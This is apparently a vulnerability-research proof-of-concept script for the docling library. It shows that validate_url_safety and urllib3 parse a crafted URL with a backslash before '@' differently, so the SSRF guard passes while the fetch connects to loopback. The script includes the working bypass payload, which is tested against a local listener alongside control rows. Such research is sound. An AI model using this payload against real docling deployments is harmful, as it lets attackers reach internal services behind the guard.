"""docling Lead L1 — validate_url_safety decides on a stdlib parse, the fetch acts on a string.

Rows, all against a listener on this container's own loopback:

  parsers    show the differential itself, with no docling involved
  off        enable_remote_fetch=False (the default)      -> OperationNotAllowed, nothing arrives
  guard      enable_remote_fetch=True, plain loopback URL -> ValueError, nothing arrives
  attack     enable_remote_fetch=True, differential URL   -> the guard passes, the socket opens
  reverse    the payload halves swapped                   -> fails closed, as it should

The listener runs inside this same container: urllib3 connects to 127.0.0.1, so the destination
must be this process's own loopback. Nothing leaves the container and no DNS query is made --
the payload's post-@ host is a literal IP, so validate_url_safety takes its literal-IP branch
and never calls gethostbyname.
"""
import json
import os
import socket
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

row = sys.argv[1]
PORT = int(os.environ.get("PORT", "18099"))
MARK = os.environ.get("MARK", "CVEHUNT")
# A literal, globally-routable IP. Nothing is ever sent to it: urllib3 opens the socket to
# 127.0.0.1. Using a literal rather than a hostname means the guard takes its literal-IP
# branch, so the lab makes no DNS query at all.
PUBLIC = os.environ.get("PUBLIC_IP", "1.1.1.1")

HITS = []


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append({"path": self.path, "headers": dict(self.headers)})
        body = b"\x89PNG\r\n\x1a\n" + b"CVEHUNT-not-a-real-image"
        self.send_response(200)
        self.send_header("Content-Type", "image/png")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def serve():
    srv = HTTPServer(("127.0.0.1", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    for _ in range(50):
        try:
            s = socket.create_connection(("127.0.0.1", PORT), timeout=1); s.close(); return
        except OSError:
            pass
    raise SystemExit("listener never came up")


out = {"row": row, "port": PORT}
try:
    import docling
    out["docling"] = docling.__version__
except Exception:
    pass

if row == "parsers":
    # No docling. Just the two parsers that disagree.
    from urllib.parse import urlparse
    from urllib3.util.url import parse_url
    import ipaddress, urllib3
    out["urllib3"] = urllib3.__version__
    out["python"] = sys.version.split()[0]
    rows = []
    for u in [
        "http://127.0.0.1:%d\\@%s/%s.png" % (PORT, PUBLIC, MARK),
        "http://%s\\@127.0.0.1:%d/%s.png" % (PUBLIC, PORT, MARK),
    ]:
        s = urlparse(u); h = parse_url(u)
        try:
            g = bool(ipaddress.ip_address(s.hostname).is_global)
        except Exception:
            g = None
        rows.append({
            "url": u,
            "stdlib_hostname_checked_by_guard": s.hostname,
            "guard_sees_global": g,
            "urllib3_host_socket_opens_to": h.host,
            "urllib3_port": h.port,
        })
    out["rows"] = rows
    print(json.dumps(out)); raise SystemExit

serve()
from docling.backend.utils.image_resource_loader import ImageResourceLoader
from docling.exceptions import OperationNotAllowed

if row == "off":
    url = "http://127.0.0.1:%d/%s.png" % (PORT, MARK)
    loader = ImageResourceLoader(enable_remote_fetch=False, enable_local_fetch=False)
elif row == "guard":
    url = "http://127.0.0.1:%d/%s.png" % (PORT, MARK)
    loader = ImageResourceLoader(enable_remote_fetch=True, enable_local_fetch=False)
elif row == "attack":
    url = "http://127.0.0.1:%d\\@%s/%s.png" % (PORT, PUBLIC, MARK)
    loader = ImageResourceLoader(enable_remote_fetch=True, enable_local_fetch=False)
elif row == "reverse":
    url = "http://%s\\@127.0.0.1:%d/%s.png" % (PUBLIC, PORT, MARK)
    loader = ImageResourceLoader(enable_remote_fetch=True, enable_local_fetch=False)
else:
    raise SystemExit("unknown row: %s" % row)

out["url"] = url

# create_image_ref() swallows OperationNotAllowed / ValueError into warnings.warn and
# returns None (image_resource_loader.py:162-177), so the guard's refusal is invisible
# there. Call load_image_data() -- the sink that actually raises and that actually calls
# validate_url_safety at :199 -- and ALSO record what the wrapper the HTML backend calls
# does with it.
import warnings as _w
with _w.catch_warnings(record=True) as caught:
    _w.simplefilter("always")
    try:
        data = loader.load_image_data(url, None)
        out["outcome"] = "FETCHED"
        out["bytes"] = len(data) if data else 0
    except OperationNotAllowed as e:
        out["outcome"] = "REFUSED"; out["error_type"] = "OperationNotAllowed"; out["error"] = str(e)[:300]
    except ValueError as e:
        out["outcome"] = "REFUSED"; out["error_type"] = "ValueError"; out["error"] = str(e)[:300]
    except Exception as e:
        # Reaching the listener and then failing to decode still proves the socket opened.
        out["outcome"] = "REACHED-THEN-RAISED"; out["error_type"] = type(e).__name__; out["error"] = str(e)[:300]
    out["warnings_from_load_image_data"] = [str(w.message)[:200] for w in caught]

hits_after_sink = len(HITS)
with _w.catch_warnings(record=True) as caught2:
    _w.simplefilter("always")
    loader.create_image_ref(url, None)
    out["create_image_ref_warnings"] = [str(w.message)[:200] for w in caught2]
out["sink_opened_socket"] = hits_after_sink > 0

out["listener_hits"] = HITS
out["socket_opened"] = len(HITS) > 0
print(json.dumps(out))
